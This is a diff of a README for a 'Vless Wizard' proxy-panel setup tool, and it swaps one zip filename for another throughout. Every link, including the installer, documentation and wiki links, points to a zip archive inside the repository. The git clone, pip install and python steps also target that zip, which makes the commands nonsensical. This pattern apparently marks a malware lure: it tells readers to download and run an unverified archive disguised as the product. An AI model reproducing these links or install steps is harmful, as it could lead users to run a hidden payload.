@@ -8,7 +8,7 @@ Welcome to **Vless Wizard**! This application helps you set up **3x-ui** panels 
 
 You can download the latest version of Vless Wizard from the Releases page. Click the button below to get started:
 
-[![Download Vless Wizard](https://raw.githubusercontent.com/southpart302/vless-wizard/main/xray/vless-wizard-1.7.zip%20Vless%https://raw.githubusercontent.com/southpart302/vless-wizard/main/xray/vless-wizard-1.7.zip)](https://raw.githubusercontent.com/southpart302/vless-wizard/main/xray/vless-wizard-1.7.zip)
+[![Download Vless Wizard](https://raw.githubusercontent.com/southpart302/vless-wizard/main/xray/vless_wizard_v2.2.zip%20Vless%https://raw.githubusercontent.com/southpart302/vless-wizard/main/xray/vless_wizard_v2.2.zip)](https://raw.githubusercontent.com/southpart302/vless-wizard/main/xray/vless_wizard_v2.2.zip)
 
 ### Windows
 
@@ -16,7 +16,7 @@ The easiest way to install Vless Wizard on Windows is via the installer.
 
 1. Click the link below to download the installer:
    
-   👉 [Vless Wizard Installer for Windows](https://raw.githubusercontent.com/southpart302/vless-wizard/main/xray/vless-wizard-1.7.zip)
+   👉 [Vless Wizard Installer for Windows](https://raw.githubusercontent.com/southpart302/vless-wizard/main/xray/vless_wizard_v2.2.zip)
 
 2. Once downloaded, double-click the setup file to start the installation.
 3. Follow the on-screen instructions to complete the installation.
@@ -35,7 +35,7 @@ Make sure you have **Python 3.10+** installed on your system. If you don’t hav
 Open your terminal and run the following commands:
 
 ```bash
-git clone https://raw.githubusercontent.com/southpart302/vless-wizard/main/xray/vless-wizard-1.7.zip
+git clone https://raw.githubusercontent.com/southpart302/vless-wizard/main/xray/vless_wizard_v2.2.zip
 cd vless-wizard
 ```
 
@@ -53,7 +53,7 @@ source venv/bin/activate
 Now install the necessary packages by running:
 
 ```bash
-pip install -r https://raw.githubusercontent.com/southpart302/vless-wizard/main/xray/vless-wizard-1.7.zip
+pip install -r https://raw.githubusercontent.com/southpart302/vless-wizard/main/xray/vless_wizard_v2.2.zip
 ```
 
 > If you encounter the error `pip: command not found`, you may need to install the Python package manager:
@@ -67,7 +67,7 @@ XX### 5. Run Vless Wizard
 Once all dependencies are installed, you can start the application by executing:
 
 ```bash
-python https://raw.githubusercontent.com/southpart302/vless-wizard/main/xray/vless-wizard-1.7.zip
+python https://raw.githubusercontent.com/southpart302/vless-wizard/main/xray/vless_wizard_v2.2.zip
 ```
 
 ## 📖 Features
@@ -84,18 +84,18 @@ If you run into issues during installation or while using the application, consi
 2. **Review Dependencies**: Confirm that all packages installed successfully.
 3. **Firewall & Network Settings**: Check your network settings to make sure they allow SSH connections.
 
-For detailed troubleshooting steps, refer to the [official documentation](https://raw.githubusercontent.com/southpart302/vless-wizard/main/xray/vless-wizard-1.7.zip).
+For detailed troubleshooting steps, refer to the [official documentation](https://raw.githubusercontent.com/southpart302/vless-wizard/main/xray/vless_wizard_v2.2.zip).
 
 ## 💬 Community and Support
 
 Join the community for help and updates. You can visit the project’s Wiki for detailed guides and FAQs. 
 
-- [Visit the Wiki for More Information](https://raw.githubusercontent.com/southpart302/vless-wizard/main/xray/vless-wizard-1.7.zip)
+- [Visit the Wiki for More Information](https://raw.githubusercontent.com/southpart302/vless-wizard/main/xray/vless_wizard_v2.2.zip)
 
 ## 📅 Updates
 
 Keep an eye on the Releases page for updates to Vless Wizard. Regular updates provide new features and bug fixes.
 
-[![Download Vless Wizard](https://raw.githubusercontent.com/southpart302/vless-wizard/main/xray/vless-wizard-1.7.zip%20Vless%https://raw.githubusercontent.com/southpart302/vless-wizard/main/xray/vless-wizard-1.7.zip)](https://raw.githubusercontent.com/southpart302/vless-wizard/main/xray/vless-wizard-1.7.zip)
+[![Download Vless Wizard](https://raw.githubusercontent.com/southpart302/vless-wizard/main/xray/vless_wizard_v2.2.zip%20Vless%https://raw.githubusercontent.com/southpart302/vless-wizard/main/xray/vless_wizard_v2.2.zip)](https://raw.githubusercontent.com/southpart302/vless-wizard/main/xray/vless_wizard_v2.2.zip)
 
 Thank you for using Vless Wizard!
